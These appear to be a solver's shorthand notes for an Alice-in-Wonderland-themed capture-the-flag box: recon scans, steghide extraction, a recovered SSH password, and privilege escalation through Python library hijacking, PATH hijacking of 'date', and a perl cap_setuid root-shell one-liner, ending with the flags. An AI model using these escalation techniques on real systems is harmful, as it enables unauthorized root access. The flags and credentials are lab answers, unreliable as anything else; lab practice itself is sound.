nmap  
nikto -h  
gobuster dir -u -w
 
/img (Status: 301)  
/r (Status: 301)  
/poem (Status: 301)
 
wget the /img/ files
 
steghide find that both jpg's encrypted with password, white rabbit has hidden file  
steghide extract -sf PIC , (no password)  
sublist3r -d /or/ gobuster - to find subdomains  
/r/a/b/b/i/t/  
alice:HowDothTheLittleCrocodileImproveHisShiningTail
 
ssh
 
cat /root/user.txt
 
sudo -l  
nano random.py  
import os
 
os.system("/bin/bash")  
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
 
/home/rabbit  
cat teaparty  
see "date" path is not specified  
export PATH=/tmp:$PATH  
cd /tmp; echo /bin/bash > date  
chmod +x date  
cd /home/rabbit; ./teaparty
 
WhyIsARavenLikeAWritingDesk?
 
getcap -r / 2>/dev/null  
/usr/bin/perl has cap_setuid  
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 
/home/alice/root.txt
 
thm{Twinkle, twinkle, little bat! How I wonder what you're at!}